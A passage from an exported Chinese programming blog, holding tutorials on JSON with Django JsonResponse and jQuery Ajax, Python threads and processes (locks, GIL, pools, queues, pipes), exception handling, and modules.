无需解析器， JavaScript 程序能够使用内建的 eval() 函数， 用 JSON 数据来生成原生的 JavaScript 对象。 2.2 JSON结构JSON有两种结构： 字典 ：表示为“{}”括起来的内容，如{key：value,key2：value2,…}的键值对的结构，key一般为字符串类型，value的类型可以是数字、字符串、数组、字典等。 数组（列表 ）：表示用“[]”括起来的内容， 如：[“Tom”,”Jack”,…] 经过字典、数组2种结构就可以组合成复杂的数据结构了。 按照最简单的形式，可以用下面这样的 JSON 表示”键&#x2F;值对”： 1&#123;&quot;FirstName&quot;:&quot;Brett&quot;&#125; 当将多个”键 &#x2F; 值对”串在一起时，JSON 就会体现出它的价值了。首先，可以创建包含多个”键 &#x2F; 值对”的 记录，比如： 1&#123;&quot;FirstName&quot;:&quot;Brett&quot;,&quot;LastName&quot;:&quot;McLaughlin&quot;,&quot;Email&quot;:&quot;aaaa&quot;&#125; 更为复杂的JSON数据： 1234567&#123; &quot;people&quot;:[ &#123;&quot;FirstName&quot;:&quot;Brett&quot;,&quot;LastName&quot;:&quot;McLaughlin&quot;,&quot;Email&quot;:&quot;aaaa&quot;&#125;, &#123;&quot;FirstName&quot;:&quot;Jason&quot;,&quot;LastName&quot;:&quot;Hunter&quot;,&quot;Email&quot;:&quot;bbbb&quot;&#125;, &#123;&quot;FirstName&quot;:&quot;Elliotte&quot;,&quot;LastName&quot;:&quot;Harold&quot;,&quot;Email&quot;:&quot;cccc&quot;&#125; ]&#125; 3、XML与JSON对比 编码的可读性，xml有明显的优势，毕竟人类的语言更贴近这样的说明结构。json读起来更像一个数据块，读起来就比较费解了。不过，我们读起来费解的语言，恰恰是适合机器阅读和解析。 编码的手写难度来说，xml还是舒服一些，好读当然就好写。不过写出来的字符JSON就明显少很多。去掉空白制表以及换行的话，JSON就是密密麻麻的有用数据，而xml却包含很多重复的标记字符。 虽然XML和JSON都有各自的编码工具，但是JSON的编码要比XML简单，即使不借助工具，也可以写出JSON代码，但要写出好的 XML代码就有点困难；与XML一样，JSON也是基于文本的，且它们都使用Unicode编码，且其与数据交换格式XML一样具有可读性。 主观上来看，JSON更为清晰且冗余更少些。JSON网站提供了对JSON语法的严格描述，只是描述较简短。从总体来看，XML比较适合于标记文档，而JSON却更适于进行数据交换处理。 在解析上，在普通的web应用领域，开发者经常为XML的解析伤脑筋，无论是服务器端生成或处理XML，还是客户端用Python解析XML，都常常导致复杂的代码，极低的开发效率。 作为一种轻量级的数据交换格式，json正在逐步取代xml，成为网络数据的通用格式。 有的json代码格式比较混乱，可以使用此http://www.bejson.com/网站来进行JSON格式化校验。此网站不仅可以检测Json代码中的错误，而且可以以视图形式显示json中的数据内容，很是方便。 三、Model转JSON1、json.dumps在Pyhton中我们通过json模块，将常用的数据类型转化为json字符串。但是，json支持转化的数据类型是有限的。 1234567import jsonlist = [&#x27;Tom&#x27;,&#x27;Jack&#x27;,&#x27;Lina&#x27;,&#x27;Jane&#x27;]str = json.dumps(list)print(str)print(type(str)) JSON序列化所能支持的Python数据类型： 1234567891011121314151617+-------------------+---------------+| Python | JSON |+===================+===============+| dict | object |+-------------------+---------------+| list, tuple | array |+-------------------+---------------+| str | string |+-------------------+---------------+| int, float | number |+-------------------+---------------+| True | true |+-------------------+---------------+| False | false |+-------------------+---------------+| None | null |+-------------------+---------------+ 2、Model -&gt; JSON 直接使用dumps序列化Model 1234def query(request): users = User.objects.all() json_str = json.dumps(users) return HttpResponse(&quot;abc&quot;) 当提交请求时，将发生以下错误： ​ TypeError：&lt;QuerySet []&gt; is not JSON serializable 将QuerySet 转为list： 1234def query(request): users = User.objects.all() json_str = json.dumps(list(users)) #将QuerySet对象转为list return HttpResponse(json_str) 再次访问，依然提示错误： TypeError：&lt;User: Tom&gt; is not JSON serializable 原因： 1234To extend this to recognize other objects, subclass and implement a``.default()`` method with another method that returns a serializableobject for ``o`` if possible, otherwise it should call the superclassimplementation (to raise ``TypeError``). 解决方案： 123def user_default(u): if isinstance(u,User): return &#123;&#x27;id&#x27;:u.id,&#x27;name&#x27;:u.name,&#x27;age&#x27;:u.age,&#x27;salary&#x27;:u.salary&#125; 1234def query(request): users = User.objects.all() json_str = json.dumps(list(users),default=user_default) #将QuerySet对象转为list return HttpResponse(json_str) 或者： 12345def query(request): users = User.objects.all().values() #返回字典形式的QuerySet json_str = json.dumps(list(users)) #将QuerySet对象转为list return HttpResponse(json_str)# 使用此方法，需要注意User类中不能有不可序列化的类型 3、JsonResponse对象原型： 1class JsonResponse(data, encoder=DjangoJSONEncoder, safe=True, json_dumps_params=None,**kwargs) 这个类是HttpResponse的子类，它和父类的主要区别在于： 它的默认Content-Type 被设置为： application&#x2F;json 第一个参数，data应该是一个字典类型，当 safe 这个参数被设置为：False ,那data可以填入任何能被转换为JSON格式的对象，比如list, tuple, set。 默认的safe 参数是 True. 如果你传入的data数据类型不是字典类型，那么它就会抛出 TypeError的异常。 json_dumps_params参数是一个字典,它将调用json.dumps()方法并将字典中的参数传入给该方法。 1234567def query1(request): user = User.objects.get(pk=1) return JsonResponse(user,safe=False,json_dumps_params=&#123;&quot;default&quot;:user_default&#125;)def query2(request): users = list(User.objects.all()) return JsonResponse(&#123;&quot;users&quot;:users&#125;,json_dumps_params=&#123;&quot;default&quot;:user_default&#125;) 总结： ​ 1、JsonResponse内部会调用json.dumps，即JsonResponse的第一个参数可以直接接Model&#x2F;集合 ​ 2、但使用JsonResponse仍然需要设置default – JsonResponse(data，json_dumps_params=&#123;&quot;default&quot;:user_default&#125;) ​ 3、如果data不是字典dict类型，需要将data转为dict &#123;&quot;key&quot;:data&#125; 或者直接将safe参数设置为False ​ 4、如果JsonResponse的第一个参数是dict类型，则在Javascript中 eval(“(“ + xhr.responseText + “)”) ​ 5、当使用JsonResponse返回时，传递的不是json字符串，而是json对象，即在javascript中接收的是一个json对象。 四、Jquery-Ajax1、$.ajax()12345678$.ajax(&#123; type:&quot;POST&quot;, url:&quot;&#123;% url &#x27;ajaxapp:test&#x27; %&#125;&quot;, data:&quot;name=Mr_lee&amp;age=18&amp;csrfmiddlewaretoken=&quot;+&quot;&#123;&#123; csrf_token &#125;&#125;&quot;, success:function (msg) &#123; alert(msg) &#125;&#125;) 2、$.get() url:待载入页面的URL地址 data:待发送 Key&#x2F;value 参数。 callback:载入成功时回调函数。 type:返回内容格式，xml, html, script, json, text, _default。 12345678$.get( &quot;&#123;% url &quot;ajaxapp:test&quot; %&#125;&quot;, &quot;name=Mr_lee&amp;age=18&quot;, function(data)&#123; alert(data) &#125;, &quot;json&quot;) 3、$.post()12345678$.post( &quot;&#123;% url &quot;ajaxapp:test&quot; %&#125;&quot;, &quot;name=Mr_lee&amp;age=18&amp;csrfmiddlewaretoken=&quot;+&quot;&#123;&#123; csrf_token &#125;&#125;&quot;, function(data)&#123; alert(data) &#125;, &quot;text&quot;) 4、$.ajaxSetup()使用jQuery的$.ajaxSetup方法可以设置AJAX请求的默认参数选项，当程序中需要发起多个AJAX请求时，则不用再为每一个请求配置请求的参数。 1对$.post和get无效 12345//为所有的请求 设置headers和url参数选项$.ajaxSetup(&#123; headers:&#123;&quot;X-CSRFToken&quot;:&quot;&#123;&#123; csrf_token &#125;&#125;&quot;&#125;, url:&quot;&#123;% url &#x27;ajax_query_user:query&#x27; %&#125;&quot; &#125;) 5、load()方法load() 方法通过 AJAX 请求从服务器加载数据，并把返回的数据放置到指定的元素中。 1$(&quot;#div_1&quot;).load(&quot;&#123;% url &#x27;ajaxapp:loadHTML&#x27; %&#125;&quot;)","categories":[],"tags":[]},{"title":"","slug":"17 进程和线程","date":"2024-10-24T11:20:58.323Z","updated":"2024-10-07T05:20:58.401Z","comments":true,"path":"2024/10/24/17 进程和线程/","permalink":"http://example.com/2024/10/24/17%20%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"进程和线程一、引言12345678910111213141516171. 程序：是完成特定任务的一系列的指令（代码）的集合，或者是打包好的二进制的可执行的文件.(程序本身是一个静态实体)2. 进程：是一个具有一定功能的程序在一个数据集上的一次动态执行过程,是操作系统进行资源分配和调度的一个独立单位（进程是动态实体） - 一个应用程序的实例对应着一个进程 - 进程是操作系统动态执行的基本单元，它可以申请和拥有系统资源 - 进程有自己独立的空间（数据空间：文本域、数据域、堆栈域） 特征： - 动态性：进程的实质是程序在操作系统中的一次执行过程，进程是动态产生的，动态消亡的+ - 并发性：任何的进程都可以同其它的进程一起并发执行（多任务） - 独立性：进程是一个能独立运行的基本单位，同时也是操作系统分配资源和调度的独立单位. 3. 线程：是操作系统能够进行运算调度的最小单位. - 一个进程可以有多个线程，各个线程之间共享程序的空间（进程资源） - 一个进程中至少包含一个主线程 （一条河流至少有主流） - 线程与线程之间可以相互独立，但资源是共享的 - 一个线程对应一个任务 1234# 并行： 指在同一时刻，有多条指令在多个处理器上同时执行，所以无论是从微观还是宏观来看，二者都是一起执行的.# 并发： 指在同一时刻只能有一条指令执行，但是多个进程指令可以被快速的轮换着去执行，使得在宏观上具有多个进程同时执行的效果，但是在微观上并不是同时执行。（宏观并行微观串行） 二、发展背景123456789101112131. 几乎所有的现代操作系统都是多任务的操作系统. - 一边在使用浏览器上网，一边听音乐，一边在用Pycharm写代码 2. 多核CPU可以并行地执行多个任务，但是由于任务数量远远大于CPU的核心数量，因此在单个CPU上会出现并发地执行多个任务的情况3. 单核CPU：实际上对于单核CPU在同一时刻，只能运行一个任务（进程），CPU不断地在这些进程间轮换执行. - 一个任务执行一小段时间后，会被强制的暂停，切换到另一个任务去执行，每个任务轮流执行 - CPU执行效率很高，时间片短，各个任务之间的切换就很快，人感觉不到（宏观并行，微观串行） - 任务调度采用的是时间片轮转的抢占式调度（抢占式优先级调度策略） - 时间片：每一个进程分配一定的时间片，它是进程允许执行的时间 抢占式：优先级高的先执行非抢占式：按顺序执行 三、多任务1231. 一种是启动多个进程，每个进程有一个主线程，但是多个进程可以同时执行多个任务2. 启动一个进程，在一个进程内启动多个线程，这样多个线程就可以同时执行多个任务 3. 多进程+多线程（一般不用） 四、多线程1234单线程和多线程：1. 单线程：一个进程中默认只有一个主线程，程序的所有资源都供给了主线程（之前写的代码都是运行在主线程中）2. 多线程：一个进程中可以有多个线程，多个线程之间同时执行，之前会相互抢占资源 12345678910111213def music(name, loop): for i in range(loop): print(&#x27;Listen the music %s&#x27; % name)def movie(name, loop): for i in range(loop): print(&#x27;watch the movie %s&#x27; % name)if __name__ == &#x27;__main__&#x27;: music(&#x27;凉凉&#x27;,3) movie(&#x27;小电影&#x27;,3) # 先执行了听音乐再执行了看电影 不能同时进行 多线程模块121. Python2: thread,threading 2. Python3: threading 12345678910# threading.Thread类def __init__(self, group=None, target=None, name=None, args=(), kwargs=None, *, daemon=None): pass - group: 是一个预留参数，用于将来扩展功能- target: 目标，这个线程要执行的任务（函数） - name: 线程的名字 默认Thread-N(1,2,3,4,5,6...) - args: 位置参数- kwargs: 关键字参数 创建多线程的方式 使用Thread类直接创建线程（子线程） 123456789101112131415161718192021222324import threadingimport timedef music(name, loop): print(threading.current_thread().getName()) # -&gt; Thread-1 for i in range(loop): time.sleep(0.1) print(&#x27;Listen the music %s,%d&#x27; % (name,i))def movie(name, loop): print(threading.current_thread().getName()) # -&gt; Thread-2 for i in range(loop): time.sleep(0.1) print(&#x27;watch the movie %s,%d&#x27; % (name,i))if __name__ == &#x27;__main__&#x27;: # music(&#x27;凉凉&#x27;,3) # movie(&#x27;小电影&#x27;,3) t1 = threading.Thread(target=music,args=(&#x27;凉凉&#x27;,3)) t2 = threading.Thread(target=movie,args=(&#x27;小电影&#x27;,3)) t1.start() t2.start() # 启动后处理就绪状态 继承Thread类，并实现run方法 12345678910111213141516171819import threadingclass MyThread(threading.Thread): def __init__(self, name): super().__init__() self.name = name def run(self): for i in range(30): print(self.name)if __name__ == &#x27;__main__&#x27;: t1 = MyThread(&#x27;1111&#x27;) t2 = MyThread(&#x27;2222&#x27;) t1.start() t2.start() Thread类中的方法123451. getName() 获取当前线程的名字 主线程：MainThread - threading.current_thread().getName() 子线程：Thread-N(1,2,3,4...) 122. setName(name) 设置线程的名字 123. ident: 返回当前线程的id 12344. is_alive(): 返回当前线程的状态 当线程未结束时，返回为True 当任务结束，返回为False 12345. join([timeout]) 在什么地方调用join，就会阻塞哪里的线程(一般都加在主线程中) join方法的功能是在程序的指定位置，优先让该方法的调用者使用CPU资源 timeout参数是一个可选参数，其功能是指定线程最多可以占用CPU资源的时间，如果不使用该参数，默认是线程执行结束 1234566. setDaemon(bool) 当程序中有多个线程时，主线程的结束并不会影响子线程的继续执行，换句话只有当程序中所有的线程执行完毕后，程序才算真正的结束 设置守护线程，必须要在启动线程之前设置 设置为守护线程后，当主线程任务结束，所有的守护线程都会被强制结束 # Python解释器的垃圾回收机制就是守护线程，当程序中所有的主线程及非守护线程执行完毕后，垃圾回收机制也就没有继续执行的必要了 五、进程和线程的状态1234# 进程的三个状态：（1）运行状态：进程占用CPU，正在运行（2）就绪状态：进程具备运行条件，等待系统分配CPU资源以便运行（3）等待状态：又称为阻塞状态或睡眠状态，指进程不具备运行条件，正在等待某个事件完成 123456789# 线程的五个状态：（1）创建状态：程序还没有开始运行线程中的代码，刚创建好线程（2）就绪状态：线程对象调用start()方法后启动了线程，然后进入就绪状态（3）运行状态：当线程获取到了CPU资源后，它才进入到运行状态（4）阻塞状态：线程中的任务暂停，不再占有CPU资源 sleep()、input（5）死亡状态：线程中的任务正常执行完毕或异常退出创建状态 -&gt; 就绪状态 -&gt; 运行状态 -&gt; 死亡状态 阻塞状态 六、GIL锁12345678910111213GIL:全局解释锁 Global Interpreter Lock1. GIL并不是Python语言的特性，Python不依赖于GIL，CPython中有GIL锁而JPython就没有2. GIL锁是为了解决多线程之间数据完整性和状态同步的问题（安全），设计为在任意时刻只有一个线程在解释器中运行. 3. GIL锁极大的影响了多线程的效率，让多线程几乎等同于单线程4. 由于GIL锁的存在，只有拥有GIL锁的线程才会拥有CPU资源，执行任务5. 对于计算密集型的任务（进行数学计算、矩阵运算、图像处理、视频编解码等），使用多线程（伪多线程）去处理，反而会由于多线程之间来回切换（获取锁和释放锁）导致效率很低（一个进程只有一个GIL锁） - 使用多进程解决6. 虽然存在GIL锁，但是Python的多线程切换速度很快，所在在宏观上依然是&#x27;并行&#x27;，但是微观上是串行. 七、线程安全123456789101112131. 线程同步： 同步：线程A在执行某个任务时，线程B需要线程A执行完毕之后，才能执行 异步：线程A在执行某个任务时，线程B不需要等待可以直接执行 2. 数据污染/脏读： 进程中的多个线程共享进程资源， 就有可能造成多个线程同时访问数据而导致数据不一致. 3. 原子操作： 原子是不可分割的最小工作单位，在执行某个任务完毕之前不会被其它的任务或事件中断.(一个线程中的任务一次性执行完毕)4. 锁： 保护原子操作不被破坏 锁：同步锁/互斥锁 threading.Lock 123456789101112131415161718192021# 这里会发生数据脏读问题import threading, timelst = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, ]index = 2def fun(ch): global lst global index lst[index] = ch time.sleep(0.1) index += 1if __name__ == &#x27;__main__&#x27;: t1 = threading.Thread(target=fun, args=(&#x27;C&#x27;,)) t2 = threading.Thread(target=fun, args=(&#x27;D&#x27;,)) t1.start() t2.start() t1.join() # 让t1和t2优先拥有CPU资源 t2.join() print(lst) 1234567891011121314151617181920212223242526# 加锁之后就是线程同步 one by one import threading, timelst = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, ]index = 2lock = threading.Lock() # 创建一把锁def fun(ch): global lst global index lock.acquire() # 获取这把锁 lst[index] = ch time.sleep(0.1) index += 1 lock.release()if __name__ == &#x27;__main__&#x27;: t1 = threading.Thread(target=fun, args=(&#x27;C&#x27;,)) t2 = threading.Thread(target=fun, args=(&#x27;D&#x27;,)) t1.start() t2.start() t1.join() # 让t1和t2优先拥有CPU资源 t2.join() print(lst) 死锁问题 1Lock对象在一个线程中对同一个原子操作，只有一次机会使用acquire来给线程加锁，如果出现了多次，则就会出现死锁状态，无法正常使用 12345678910def fun(ch): global lst global index lock.acquire() # 获取这把锁 lock.acquire() # 获取这把锁两次 就会产生死锁 lst[index] = ch time.sleep(0.1) index += 1 lock.release() 123解决死锁问题： 使用RLock对象来解决死锁问题，允许同一个原子操作来重复获取锁 lock = threading.RLock() 八、多进程模块1、多进程模块123# multiprocessing 多进程模块1. 解决多线程于计算密集型任务处理速度慢的情况2. 多进程不受GIL锁的限制，可以达到并行状态 12345678910111213141516171819import multiprocessingimport time, randomdef run(name): print(&#x27;%s running&#x27; % name, multiprocessing.current_process().pid) time.sleep(random.randrange(1, 5)) print(&#x27;%s running end&#x27; % name)if __name__ == &#x27;__main__&#x27;: p1 = multiprocessing.Process(target=run, args=(&#x27;anne&#x27;,)) p2 = multiprocessing.Process(target=run, args=(&#x27;alice&#x27;,)) p3 = multiprocessing.Process(target=run, args=(&#x27;biantai&#x27;,)) p1.start() p2.start() p3.start() p1.join() # 需要等待p1任务结束 print(&#x27;主进程&#x27;) 2、进程之间数据不共享1234567891011121314151617181920212223import multiprocessing, timelst = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, ]index = 2def fun(ch): global lst global index lst[index] = ch time.sleep(0.1) index += 1 print(lst) # 打印全局变量lstif __name__ == &#x27;__main__&#x27;: t1 = multiprocessing.Process(target=fun, args=(&#x27;C&#x27;,)) t2 = multiprocessing.Process(target=fun, args=(&#x27;D&#x27;,)) t1.start() t2.start() t1.join() # 让t1和t2优先拥有CPU资源 t2.join() # 每个进程拥有自己独立的空间 3、进程锁1231. 进程之间的数据是不共享的，但是共享同一套文件系统，所以访问同一个文件时可能会有问题2. 所以此时需要加锁处理 1234567891011121314151617181920212223242526import timefrom multiprocessing import Process,Lockdef buy_ticket(i, lock): lock.acquire() # 加锁 with open(&#x27;ticket.txt&#x27;) as f: count = int(f.read()) time.sleep(0.1) if count &gt; 0: count -= 1 print(f&#x27;\\033[32m&#123;i&#125;买到票了\\033[0m&#x27;) else: print(f&#x27;\\033[31m&#123;i&#125;没有买到票\\033[0m&#x27;) time.sleep(0.1) with open(&#x27;ticket.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(count)) lock.release() # 释放锁 if __name__ == &#x27;__main__&#x27;: lock = Lock() for i in range(1, 11): p = Process(target=buy_ticket, args=(i, lock)) p.start() 4、进程池1231. 进程池：在进程任务特殊多的情况下，手动挨个来管理进程比较麻烦，可以通过设置进程池来进程管理2. 可以设置指定数量的进程，当有新的请求提交到进程池中，如果进程池还没满，则可以直接创建进的进程去执行，如果进程满了（达到最大数量），则会等待进程池中某个进程结束，才会创建新的进程并执行 123456789101112131415161718import multiprocessing, timedef do_thing(n): print(f&#x27;第&#123;n&#125;个人上厕所&#x27;) time.sleep(2) print(f&#x27;第&#123;n&#125;个人上厕所结束&#x27;)if __name__ == &#x27;__main__&#x27;: pool = multiprocessing.Pool(3) # 三个坑 for i in range(5): # async：异步（同时） pool.apply_async(func=do_thing, args=(i + 1,)) pool.close() # 关闭进程池 不能再让新的进程进来了 pool.join() 常用方法： 12345678910111213141. apply() 同步，阻塞池中的进程（等待状态） 2. apply_async() 异步，非阻塞式，池中的进程可以同时执行 3. close() 关闭进程池，不再接受新的请求（任务） 4. teminate() 结束工作进程，不再处理未完成的任务（正在执行中的任务中断） 5. join() 阻塞主进程，等待子进程的结束 九、进程间通信12345678910111. 操作系统会为每一个进程分配一个独立的地址空间，不同进程的地址空间是完全隔离的2. 虽然可以用文件共享数据实现进程间通信（买票的案例），但是问题是： - 效率低（对文件读写操作） - 需要自己加锁处理 3. Python中进程间通信： - 队列 Queue - 管道 Pipe 4. 队列和管道都是将数据存放在内存中而不是文件 1、队列队列并不是数据的共享，而是数据的传递 12345678910111213141516171819202122232425262728import multiprocessing, timedef put(queue): for i in [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]: print(f&#x27;发送&#123;i&#125;到队列中&#x27;) queue.put(i) time.sleep(1)def get(queue): while 1: value = queue.get() # 从队列取数据，并将数据从队列中删除 print(f&#x27;从队列中取到&#123;value&#125;&#x27;)if __name__ == &#x27;__main__&#x27;: queue = multiprocessing.Queue() # 这个进程是向队列中存数据 p_put = multiprocessing.Process(target=put, args=(queue,)) p_get = multiprocessing.Process(target=get, args=(queue,)) p_put.start() p_get.start() p_put.join() p_get.terminate() # 终止正在执行的进程 2、管道1234561. Pipe(duplex=True) 返回的是一个元组（conn1,conn2）表示管道的两端 duplex默认为True,表示管道是双工模式 duplex是False，conn1只负责接收消息，conn2来发送消息 2. send()、recv() 发送消息和接收消息 12345678910111213141516171819202122232425262728import multiprocessing, timedef put(pipe): for i in [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]: print(f&#x27;发送&#123;i&#125;到管道中&#x27;) pipe[1].send(i) time.sleep(1)def get(pipe): while 1: value = pipe[0].recv() # 从队列取数据，并将数据从队列中删除 print(f&#x27;从管道中取到&#123;value&#125;&#x27;)if __name__ == &#x27;__main__&#x27;: pipe = multiprocessing.Pipe() # 这个进程是向队列中存数据 p_put = multiprocessing.Process(target=put, args=(pipe,)) p_get = multiprocessing.Process(target=get, args=(pipe,)) p_put.start() p_get.start() p_put.join() p_get.terminate() # 终止正在执行的进程 十、生产者与消费者1生产者与消费者模式：生产者与消费不直接通讯，而是通过队列进行通讯，队列是一个缓冲区，生产者产生了数据丢给队列（缓冲区），消费者从队列取数据 1234567891011121314151617181920212223242526272829# 消费者def consumer(q): while 1: res = q.get() if res is None: break # time.sleep(random.randrange(3,5)) print(&#x27;\\033[32m %s 吃 %s\\033[0m&#x27; % (os.getpid(), res))# 生产者def producer(q): for i in range(10): res = &#x27;包子%s&#x27; % (i + 1) time.sleep(random.randrange(1, 3)) q.put(res) print(&#x27;\\033[31m %s 生产了 %s\\033[0m&#x27; % (os.getpid(), res)) q.put(None)if __name__ == &#x27;__main__&#x27;: queue = Queue() # 生产者 p1 = Process(target=producer, args=(queue,)) # 消费者 c1 = Process(target=consumer, args=(queue,)) p1.start() c1.start() print(&#x27;主...&#x27;) 补充：threadlocal 12345678910111213141516171819# 每一个线程会创建一个副本，访问的是自己内容的局部变量import threadinglocal = threading.local() # 全局变量def f(value): local.val = value print(&#x27;%s 中的值为 %s&#x27; % (threading.current_thread(), local.val))if __name__ == &#x27;__main__&#x27;: t1 = threading.Thread(target=f, args=(&#x27;t1&#x27;,)) t2 = threading.Thread(target=f, args=(&#x27;t2&#x27;,)) t1.start() t2.start() t1.join() t2.join()","categories":[],"tags":[]},{"title":"","slug":"16 异常处理","date":"2024-10-24T11:20:58.321Z","updated":"2024-10-07T05:20:58.289Z","comments":true,"path":"2024/10/24/16 异常处理/","permalink":"http://example.com/2024/10/24/16%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/","excerpt":"","text":"异常处理一、简介12345671. 异常处理是编程语言或计算机硬件里的一种机制，用于处理软件或信息系统中出现的异常状况.2. 异常是程序执行过程中，发生了某种‘错误’，影响程序的正常运行. Python程序在执行前有可能会发生语法错误，也会导致程序无法正常执行。 - 运行时错误 - 语法错误3. 异常处理的目的：通过异常处理，我们可以对程序中出现的意外情况进行处理，防止程序崩溃，增加程序的健壮性 1234567891011121314151617在编程语言处理异常： 1. 使用if判断进行处理 a = 5 b = 0 if b != 0: print(a / b) else: print(&#x27;除数不能为0&#x27;) 2. 使用try块处理 a = 5 b = 0 try: print(a/b) except: print(&#x27;除数不能为0&#x27;)# if更适合用于一些可以预判的一种异常情况，但是if不可能把所有的异常情况都判断到，有些异常是我们无法预知 二、常见的异常123456789101112131415161718192021222324252627282930313233343536373839404142异常分类：(1)语法错误 (2)运行时错误1. NameError： 名字异常 变量未定义，直接去使用 NameError: name &#x27;a&#x27; is not defined 2. IndentationError： 缩进错误 在同一个代码块中，使用了不同的缩进 3. SyntaxError：语法错误 1a = 5 变量名不能以数字开头 4. TypeError: 类型错误 print(1+&#x27;1&#x27;) 字符串和Int类型不能直接相加 5. ZeroDivisionError：除数为零错误 10/0 ZeroDivisionError: division by zero 6. FileNotFoundError： 文件未找到错误 读文件时，文件不存在 7. StopIteration：迭代器异常 next()调用次数超过了元素的个数8. KeyError：键错误 访问字典不存在的键 d[key]9. ValueError: 值错误 print(int(&#x27;abc&#x27;)) 将字符串强制转为int 10. AttributeError：属性错误 访问对象中不存在的属性或方法时 11. indexError：下标（越界）异常 下标超出范围12. RecursionError：递归异常 递归超过最大深度 以上的异常类型都是由类定义的 13. Exception: 常见的错误异常的基类（父类）14. BaseException：所有异常的基类 三、处理异常一般情况下，Python无法正确处理&#x2F;执行程序时，就会发生（抛出）一个异常. 异常是一个对象，表示一个错误. 当Python程序发生异常时，我们就需要捕获并处理它，否则程序会终止执行（崩溃）. 12345678910111213141516171. try-except try: 可能出现异常的代码 except: 所有的异常都会在这里处理（全捕获） try: 可能出现异常的代码 except 异常类型 as 变量名: 只有匹配异常类型时，才会执行except （精准匹配） # 注意：如果发生了异常，异常后面的代码不会被执行 try: 10/0 print(&#x27;go on&#x27;) # 这行代码不会被执行except: xxx 示例： 1234567891011121314# 全匹配try: 10/0 # print([][1])except : print(&#x27;发生了错误&#x27;)# 精准匹配try: 10/0 # print([][1])except IndexError as e: print(&#x27;发生了错误&#x27;) 1234567891011121314151617181920212. try-except-except try: 可能出现异常的代码 except 异常类型1 as e: 该类型的异常处理 except 异常类型2 as e: 另一种类型的异常处理 except: xxx# 注意：通用性最高的要放最后面，匹配性最高的要放最前面 try: 10/0 # print([][1]) # print(int(&#x27;abc&#x27;))except Exception as e: # 这里的except往后放 通用性强 print(&#x27;发生下标越界错误&#x27;,e)except ZeroDivisionError as e: print(&#x27;发生了除数为零的错误&#x27;,e)except: print(&#x27;未知类型的异常&#x27;) 1234567891011121314151617181920# 多个except后面接异常类型try: # 10/0 print([][1])except IndexError as e: print(&#x27;发生下标越界错误&#x27;,e)except ZeroDivisionError as e: print(&#x27;发生了除数为零的错误&#x27;,e)# 在最后，加except不加异常类型：用于匹配其它情况（相当于if..elif..elif..else中的else）try: # 10/0 # print([][1]) print(int(&#x27;abc&#x27;))except IndexError as e: print(&#x27;发生下标越界错误&#x27;,e)except ZeroDivisionError as e: print(&#x27;发生了除数为零的错误&#x27;,e)except: print(&#x27;未知类型的异常&#x27;) 12345673. try-except-except-else try: 可能出现异常的代码 except Exception as e: print(e) else: print(&#x27;如果没有发生异常则执行else&#x27;) 示例： 123456789101112import tracebacktry: # 可能出现异常的代码 a = int(input(&#x27;输入a:&#x27;)) b = int(input(&#x27;输入b:&#x27;)) print(a / b)except: print(&#x27;出错了&#x27;) traceback.print_exc()else: print(&#x27;这是else&#x27;) 123456789101112134. try-except-except-finally - 不论代码是否出现异常，都会执行finally import tracebacktry: a = int(input(&#x27;输入a:&#x27;)) b = int(input(&#x27;输入b:&#x27;)) print(a / b)except: traceback.print_exc()finally: print(&#x27;最终~~~~&#x27;) 四、自定义异常123456789101112131415161718class MyException(BaseException): def __init__(self, msg): self.__msg = msg def __str__(self): return self.__msgtry: a = int(input(&#x27;输入a:&#x27;)) b = int(input(&#x27;输入b:&#x27;)) if b == 1: # 什么时候抛出异常，以及什么是异常由程序员来决定 raise MyException(&#x27;除数不允许为1&#x27;) else: print(a / b)except MyException as e: print(e)","categories":[],"tags":[]},{"title":"","slug":"13 模块","date":"2024-10-24T11:20:58.318Z","updated":"2024-10-07T05:21:00.025Z","comments":true,"path":"2024/10/24/13 模块/","permalink":"http://example.com/2024/10/24/13%20%E6%A8%A1%E5%9D%97/","excerpt":"","text":"模块一、模块概念1234567891011121314151617181. 在一个大型项目的开发过程上，如果将所有的代码都写在一个.py文件中，那么将会导致文件中的代码过长，代码的阅读和维护变得很困难.2. 因此，我们可以根据功能需求的不同，将项目中的不同功能实现的代码放置在不同的.py文件中. - 人员信息管理系统： - Date类放在date.py - Person类放在person.py - PersonList类放在personlist.py 3. 在Python中，一个.py文件就称之为一个模块（module）,即一个py文件被看作是一个独立的模块.4. 一个项目，可以由很多个.py文件来组成，当然我们也可以将多个关系比较紧密的.py文件中组织在一起，放在一个目录中（Python中的包）. 项目名： 目录1-包1 1.py 2.py 目录2-包2 hello.py world.py 项目结构 1234567891011121314# 在Python中，如何管理项目结构1. 一个项目可以分为很多个目录（包），一个包就是一个完整的功能模块的集合2. 每个包里又可以有很多个.py文件3. 每个py文件中，可以有很多个变量、函数、类..4. 每个类中，又可以有很多个属性和方法目的：最终实现&#x27;模块化开发&#x27;，一个项目分为很多个功能模块 - 结构清晰 - 方便维护 - 复用性高 二、模块的分类1234567891011121. 内置模块（Python自带，已经写好的.py文件，安装python解释器时已经有了） - os模块、time模块、sys模块、math模块.... - 在这些模块中，定义好了很多个变量、函数、类等，可以供程序员直接使用 2. 自定义模块（自己写的.py文件） - demo01.py demo02.py - 定义模块名时，不要和内置模块重名 - 模块名一般小写 3. 第三方开源模块（大牛/别人写好的.py文件） - pypi.org 供开源作者上传他的py文件，其他人下载py文件 （闲鱼） - download下载压缩 或 pip install 模块名 三、模块的使用 内置模块 1234567891011121314151617181920import math # 导入模块print(math.pi)print(math.pow(2,3))print(math.hypot(3,4))或import math as mtprint(mt.pi)或from math import piprint(pi)或from math import pi as pai print(pai)或from math import * # 导入所有print(pi) 自定义模块 1234# student.pya = 100def f(): print(&#x27;this is student function&#x27;) 123456789# studentlist.pyimport studentprint(student.a)import student as stprint(st.a)st.f()# 与内置模块的导入是一样的 总结： 内置、自定义模块导入方式： 1234567891. import 模块名1,模块名22. import 模块名 as 别名3. from 模块名 import 标识符（全局变量、函数、类）4. from 模块名 import 标识符 as 别名5. from 模块名 import * 